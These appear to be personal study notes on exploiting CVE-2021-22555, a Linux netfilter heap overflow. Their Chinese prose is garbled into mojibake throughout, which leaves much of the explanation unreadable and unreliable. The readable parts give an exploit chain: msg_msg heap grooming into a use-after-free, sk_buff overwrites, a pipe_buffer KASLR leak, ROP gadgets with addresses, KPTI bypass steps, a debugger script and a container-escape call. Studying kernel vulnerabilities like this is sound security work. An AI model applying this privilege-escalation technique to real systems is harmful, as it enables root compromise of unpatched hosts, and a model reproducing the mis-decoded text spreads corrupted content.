## ç¼–è¯‘é€‰é¡¹

å½±å“ç‰ˆæœ¬ï¼šLinux v2.6.19-rc1~v5.12-rc7 v5.12-rc8å·²ä¿®è¡¥ï¼Œæ¼æ´å­˜åœ¨äº†15å¹´ï¼Œè¯„åˆ†7.8ã€‚ 
å·²ä¿®å¤çš„ç‰ˆæœ¬æœ‰ 5.12ï¼Œ5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267ã€‚ ç”±syzkallerå‘ç°

é€šè¿‡é˜…è¯»[æ­¤ç¯‡æ–‡ç« ](https://bsauce.github.io/2021/09/23/CVE-2021-22555/)å­¦ä¹ ï¼Œåœ¨ä½œè€…çš„githubæä¾›äº†[config](https://github.com/bsauce/kernel-exploit-factory/blob/main/CVE-2021-22555/config)æ–‡ä»¶ã€‚

```config
CONFIG_IP_NF_** å…¨ä¸ºy
CONFIG_NETFILTER_** å…¨éƒ¨ä¸º `y`
CONFIG_E1000å’ŒCONFIG_E1000Eï¼Œå˜æ›´ä¸º=y

CONFIG_USER_NS=y
CONFIG_NET_NS=y
CONFIG_COMPAT=y
```

ç¼–è¯‘å†…æ ¸

```bash
$ wget https://raw.githubusercontent.com/bsauce/kernel-exploit-factory/main/CVE-2021-22555/config
$ make olddefconfig
$ make -j32 bzImage
```

ä½†æ˜¯è¿˜éœ€è¦æ‰‹åŠ¨æ”¹ä¸€äº› `CONFIG_NETFILTER` é€‰é¡¹ï¼Œç„¶å `make olddefconfig`

## å¤§è‡´åŸç†

è¯¦æƒ…çœ‹[pdf](./study.pdf)

æ¼æ´å‘ç°ï¼šä½œè€…æ ¹æ® CVE-2016-3134 && CVE-2016-4997 åœ¨ Netfilter å­ç³»ç»Ÿå¯»æ‰¾ `memset()` && `memcpy()` ä¹‹ç±»çš„å‡½æ•°ï¼Œç„¶åå°±æ‰¾åˆ°äº†ã€‚

*xtable: backend for {ip, ip6, arp}_tables*

`net/netfilter/x_tables.c` ä¸­ Netfilter æ¨¡å—çš„ip_tableså­æ¨¡å—ï¼Œå½“è°ƒç”¨setsockopt()å’Œé€‰é¡¹IPT_SO_SET_REPLACEï¼ˆæˆ– IP6T_SO_SET_REPLACEï¼‰æ—¶ï¼Œåœ¨32ä½è½¬åŒ–ä¸º64ä½æ—¶è®¡ç®—é”™è¯¯ï¼Œå¯¼è‡´åœ¨è°ƒç”¨ xt_compat_match_from_user() | xt_compat_target_from_user() å‡½æ•°æ—¶, **å †æº¢å‡ºå†™ 0**ï¼Œä¸”é—®é¢˜ç›¸åŒï¼ˆè™½ç„¶ä¿®å¤å patch è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œéœ€è¦è¿™ä¸¤ä¸ªå‡½æ•°é…åˆè¿›è¡Œè§¦å‘ã€‚

xt_compat_match/target_from_user: IPT_SO_SET_REPLACE é€‰é¡¹ä¼šå…ˆåè°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°
- padæ±‚æ³•ï¼šå…ˆå¯¹å…¶ï¼Œç„¶åå‡å»åŸå…ˆçš„sizeã€‚XT_ALIGNï¼šå‘ä¸Šå–8å¯¹é½ï¼›memset: å°†padçš„åŒºåŸŸ ç½®ä¸º \0
- ä¸¤æ¬¡å¯¹é½ï¼Œå¯¼è‡´å‡ºç°é—®é¢˜

```cpp
// https://elixir.bootlin.com/linux/v5.10.27/source/net/netfilter/x_tables.c
void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,
			       unsigned int *size)
{
	const struct xt_match *match = m->u.kernel.match;
	struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;
	int pad, off = xt_compat_match_offset(match);
	u_int16_t msize = cm->u.user.match_size;
	char name[sizeof(m->u.user.name)];

	m = *dstptr;
	memcpy(m, cm, sizeof(*cm));
	if (match->compat_from_user)
		match->compat_from_user(m->data, cm->data);
	else
		memcpy(m->data, cm->data, msize - sizeof(*cm));
	pad = XT_ALIGN(match->matchsize) - match->matchsize;
	if (pad > 0)
		memset(m->data + match->matchsize, 0, pad);

	msize += off;
	m->u.user.match_size = msize;
	strlcpy(name, match->name, sizeof(name));
	module_put(match->me);
	strncpy(m->u.user.name, name, sizeof(m->u.user.name));

	*size += off;
  // msize = u.user,match_size + off
	*dstptr += msize;
}
EXPORT_SYMBOL_GPL(xt_compat_match_from_user);

void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
				unsigned int *size)
{
	const struct xt_target *target = t->u.kernel.target;
	struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;
	int pad, off = xt_compat_target_offset(target);
	u_int16_t tsize = ct->u.user.target_size;
	char name[sizeof(t->u.user.name)];

	t = *dstptr;
	memcpy(t, ct, sizeof(*ct));
	if (target->compat_from_user)
		target->compat_from_user(t->data, ct->data);
	else
		memcpy(t->data, ct->data, tsize - sizeof(*ct));
	pad = XT_ALIGN(target->targetsize) - target->targetsize;
	if (pad > 0)
		memset(t->data + target->targetsize, 0, pad);

	tsize += off;
	t->u.user.target_size = tsize;
	strlcpy(name, target->name, sizeof(name));
	module_put(target->me);
	strncpy(t->u.user.name, name, sizeof(t->u.user.name));

	*size += off;
	*dstptr += tsize;
}
EXPORT_SYMBOL_GPL(xt_compat_target_from_user);
```

åˆ©ç”¨æ—¶å¯èƒ½ä¼šé€ æˆäº›è®¸çš„æ•°æ®åå·®ï¼Œåˆ°æœ€ååˆ©ç”¨å°±æ—¶**ä¸¤å­—èŠ‚å †æº¢å‡ºå†™0**ã€‚

## exploit

~~èŠ±äº†å¾ˆé•¿æ—¶é—´ï¼Œæœ€åæ²¡æœ‰æˆåŠŸğŸ˜­~~ æˆ‘åˆè§‰å¾—æˆ‘è¡Œäº†ã€‚

å¼€å¯ kaslr,smap,smep,kpti é˜²æŠ¤ï¼Œä½†æ˜¯è°ƒè¯•æ—¶ å…³é—­ kaslr

### trigger heap overflow debug

xtable_info ç»“æ„ä½“ï¼š

```cpp
struct xt_table_info {
	unsigned int size;													// è¡¨ä¸­æ‰€æœ‰è§„åˆ™ruleå ç”¨çš„å†…å­˜å¤§å°
	unsigned int number;												// è¡¨ä¸­å­˜çš„ruleä¸ªæ•°
	unsigned int initial_entries;								// åˆå§‹åŒ–è¡¨æ—¶åˆ›å»ºçš„é»˜è®¤ruleä¸ªæ•°
	unsigned int hook_entry[NF_INET_NUMHOOKS];	// å„ä¸ªhook(chain)åœ¨è¡¨ä¸­çš„åç§»é‡
	unsigned int underflow[NF_INET_NUMHOOKS];		// å„ä¸ªhook(chain)ä¸­é»˜è®¤è§„åˆ™åœ¨è¡¨ä¸­çš„åç§»é‡
	unsigned int stacksize;
	void ***jumpstack;
	unsigned char entries[] __aligned(8);				// æ•°ç»„ï¼Œå­˜å‚¨å„ä¸ªcpuä¸Šè‡ªå·±ruleæ‹·è´çš„å†…å­˜é¦–åœ°å€
                    //æ¯ä¸ª`entries` åŒ…å« `ipt_entry` + `xt_entry_match` + pad + `xt_entry_target`
};

struct __attribute__((__packed__)) {
  struct ipt_replace replace;
  struct ipt_entry entry;
  struct xt_entry_match match;
  char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
  struct xt_entry_target target;
} data = {0};
```

è®¾ç½®æ–­ç‚¹åœ¨ä¸¤ä¸ªæ¼æ´å‡½æ•°ä¸Šï¼Œç”¨æˆ·è¿›ç¨‹é€šè¿‡ setsockopt ä¸å†…æ ¸ netfilter è¿›è¡Œäº¤äº’ï¼Œè§¦å‘æ¼æ´ã€‚
![trigger](./imgs/trigger.png)

æŸ¥çœ‹å†…å­˜ï¼Œæ ¹æ®tagï¼Œå…¶åé¢çš„å†…å®¹ä¸º msg_msg ç»“æ„ä½“

å¹¶ä¸”å¯ä»¥å‘ä¸Šå¯»æ‰¾æ¼æ´ç³»åˆ—å‡½æ•°ï¼Œå¯»æ‰¾åˆ°å‡½æ•°ä¼ é€’çš„å‚æ•°
![funcs](./imgs/funcs.png)

0xa+0x4+0x4 => 0x12 å› æ­¤ä¸¤å­—èŠ‚æº¢å‡ºã€‚

### heap overflow to uaf

1. åˆ›å»º0x1000ä¸ªä¸»ä»æ¶ˆæ¯ï¼Œä¸»æ¶ˆæ¯ object å¤§å° 0x1000, ä»æ¶ˆæ¯ object å¤§å° 0x400ã€‚å…ˆå¡«å……ä¸»æ¶ˆæ¯ï¼Œåå¡«å……ä»æ¶ˆæ¯
2. é‡Šæ”¾1024ï¼Œ2048ï¼Œ3072çš„ä¸»æ¶ˆæ¯ï¼Œåˆ›é€  0x1000 çš„ msg hole
3. è§¦å‘å †æº¢å‡ºï¼Œå°†é‡Šæ”¾çš„æŸä¸ªæ¶ˆæ¯çš„ ä¸‹ä¸€ä¸ªæ¶ˆæ¯ `msg_msg->m_list.next` æœ«å°¾ä¸¤å­—èŠ‚ä¿®æ”¹ä¸º0ï¼ŒæŒ‡å‘å…¶ä½™secondary_msgï¼Œé€ æˆä¸¤ä¸ª primary_msg(real/victim) æŒ‡å‘åŒä¸€ä¸ª secondary_msg
4. é€šè¿‡æ¶ˆæ¯å†…å®¹ï¼Œå®šä½å ä½çš„æ¶ˆæ¯
5. ä½¿ç”¨ real msg_queue é‡Šæ”¾ secondary_msgï¼Œç„¶åä½¿ç”¨ sk_buff å ä½ï¼Œä»è€Œå¯ä»¥ä»»æ„å†™ç›®çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ victim msg_queue ä»»æ„è¯»
- å…ˆä¿®æ”¹ m_ts å¤§å°ï¼ˆå°äº 0x1000ï¼‰ï¼Œä»è€Œæ³„éœ² victim secondary_msg çš„ next secondary_msg å†…å®¹ï¼Œä»è€Œå¾—åˆ° next primary_msg çš„åœ°å€
- åœ¨ä¿®æ”¹ m_next æŒ‡é’ˆå’Œ m_ts ï¼Œæ³„éœ² next primary_msg å†…å®¹ï¼Œä»è€Œå¾—åˆ° next secondary_msg åœ°å€
- slab-1024 object ç›¸é‚»ï¼Œå¯ä»¥å¾—åˆ° victim secondary_msg åœ°å€

![victm_msg](./imgs/victim_msg_addr.png)

### bypass kaslr

pipe->buf 0x280 ä½¿ç”¨ kmalloc-1024, å› æ­¤å¯ä»¥ä½¿ç”¨ pipe_buffer->ops ä¸­çš„ç»“æ„ä½“ leak 

### ROP

close pipe æ—¶ä¼šè°ƒç”¨ `pipe_buffer->ops->release`
bypass smep, smap, kptiï¼Œç›´æ¥å‘å†…æ ¸å †(secondary_msg 0x400 è¶³å¤Ÿçš„)ä¸­ä½¿ç”¨sk_buffå†™å…¥ropé“¾

å¦‚æœç›´æ¥è·³åˆ°å †ä¸Š,ROPæŠ¥é”™
![Alt text](./imgs/fail.png)

çœ‹æºç ï¼Œæ–­ç‚¹è®¾ç½®åœ¨ `free_pipe_info`ï¼Œæœ€ç»ˆè°ƒç”¨ `pipe_buf_release`.æŸ¥çœ‹å¯„å­˜å™¨çš„å€¼, æˆ–è€…ç›´æ¥çœ‹å‡½æ•°, rsi ä¸ºæˆ‘ä»¬ çš„ buf ç»“æ„ä½“.
- åœ¨ pipe_buffer ä¹‹ä¸­ä¼ªé€ ä¸€ä¸ª fake ops ç»“æ„ä½“ï¼Œé‡Šæ”¾ pipe çš„æ—¶å€™ä¼šè°ƒç”¨ ops->release ï¼Œè¿™æ—¶ pipe_buffer ä¼šåœ¨rsi æŒ‡é’ˆä¹‹ä¸­ã€‚
- rax => releaseçš„å€¼ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¡«å…¥çš„åœ°å€

1. å› æ­¤æ‰¾ gadget å¯ä»¥é€šè¿‡ rsi æ§åˆ¶ rsp
2. é€šè¿‡ rax æ§åˆ¶ rsp
![Alt text](./imgs/pipe_release.png)

æ‰¾åˆ°å¦‚ä¸‹gadget, ä½†æ˜¯rcx=0 rbx=0 åœ°å€ä¸å¯è®¿é—®

```cpp
0xffffffff81684618 : push rsi ; pop rsp ; add byte ptr [rcx + 0x5c], al ; pop r13 ; pop rbp ; ret
0xffffffff810899d3 : push rsi ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret 
0xffffffff826dcc2a : push rsi ; jmp rsi  => unable to handle page fault for address: ffffffff826dcc2a
mov rsi, rsp ç›´æ¥æˆ–è€…é—´æ¥æ²¡æ‰¾åˆ°
```

é—´æ¥è·³è½¬
```cpp
0xffffffff81bbc539 : push rsi ; jmp qword ptr [rsi + 0x45] 
```

è¿˜æœ‰å°±æ˜¯ swapgs_restore_regs_and_return_to_usermode ç»•è¿‡KPTIä¿æŠ¤å¤±è´¥~~è°ƒè¯•ï¼šè¿™ä¸ª test ä¸æˆç«‹å¯¼è‡´æ— æ³•è¿›è¡Œ ? å¾ˆç–‘æƒ‘~~ï¼ˆçœ‹åé¢

```cpp
swapgs_restore_regs_and_return_to_usermode+22
fake rax = 0
fake rdi = 0
rip = get_shell
cs
rflags
rsp
ss
```

```cpp
pwndbg> x/60wi 0xffffffff81e00fc6
   0xffffffff81e01058 <common_interrupt_return+168>:    nop    DWORD PTR [rax+rax*1+0x0]
=> 0xffffffff81e01060 <common_interrupt_return+176>:    test   BYTE PTR [rsp+0x20],0x4
```

æ²¡æœ‰å¦‚ä¸‹çš„gadgetï¼Ÿ
```cpp
iretq
sysret
```

é™ä½å†…æ ¸ç‰ˆæœ¬ï¼ŒåŒæ ·çš„é—®é¢˜ï¼Œä½†æ˜¯
- ä½¿ç”¨ **pwntools æ‰¾ gadget**, å‘ç°èƒ½æ‰¾åˆ° iretq
- ä½¿ç”¨ swapgs ç„¶å iretq æ³¨å†Œ signal å‡½æ•°è¿›è¡Œæ”»å‡» : å¡æ­»ğŸ¥² 
- sysret

```cpp
swapgs;
iretq
rip
...
// sysret çš„å‚æ•°è®¾ç½®
rcx: save the rip of the code to be executed when returning to userspace
r11: save eflags
popq    %rdi
popq    %rsp
swapgs
sysretq
rip
...
```

é—®é¢˜å‡ºç°åœ¨å“ªé‡Œï¼Ÿæ‰¾ä¸ªç±»ä¼¼çš„[CTF: d3kheap](https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/)é¢˜ç›®è°ƒè¯•ä¸€ä¸‹
- [github åœ°å€](https://github.com/arttnba3/D3CTF2022_d3kheap)
- ææƒæˆåŠŸ, æ–­ç‚¹è®¾ç½®åœ¨ swapgs ï¼Œå¯ä»¥ææƒæˆåŠŸï¼Œçœ‹çœ‹å¯„å­˜å™¨å’Œæ ˆå¸§
- ä¸€çœ‹æˆ‘çš„è°ƒè¯•æ ˆï¼Œ å¯„å­˜å™¨(ss, esp, eflags)éƒ½æ˜¯0ï¼Œå‘ç°æ²¡æœ‰ save_status ğŸ¤¡ã€‚
- ä½¿ç”¨ä¸¤ç§æ–¹å¼ææƒæˆåŠŸ

![success](./imgs/success.png)

è°ƒè¯•è„šæœ¬

```bash
file /kernel/linux-5.8/vmlinux
# add-symbol-file <file> <offset> 
target remote :1234

b xt_compat_match_from_user
b xt_compat_target_from_user

# b pipe_buf_release
b *0xffffffff81711cfc
b *0xffffffff81c00f30+22
b *0xffffffff8107b3c0
```

---
å­˜åœ¨æ›´ç®€å•åˆ©ç”¨æ–¹å¼ï¼š[dirty pipe](https://github.com/veritas501/CVE-2021-22555-PipeVersion)


å®¹å™¨ææƒ éœ€è¦åœ¨æ‰§è¡Œ switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)

## summary

ä¸€ç§æ¯”è¾ƒé€šç”¨çš„æ¼æ´åˆ©ç”¨æ–¹å¼ï¼šæ‰“å¼€å†…æ ¸ heap overflow è½¬åŒ–ä¸º use after freeçš„æ€è·¯ï¼Œè¿›è€Œåˆ©ç”¨ã€‚
ä½†æ˜¯å¦‚ä½•å¯»æ‰¾æ¼æ´è§¦å‘çš„ç‚¹ï¼Œä»¥åŠç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„äº¤äº’ & å‚æ•°å…³ç³»è¿˜æ˜¯æ¯”è¾ƒéš¾ç†è§£ã€‚

é—®é¢˜ï¼š å†…æ ¸ ROP ç¼ºä¹ç†Ÿç»ƒåº¦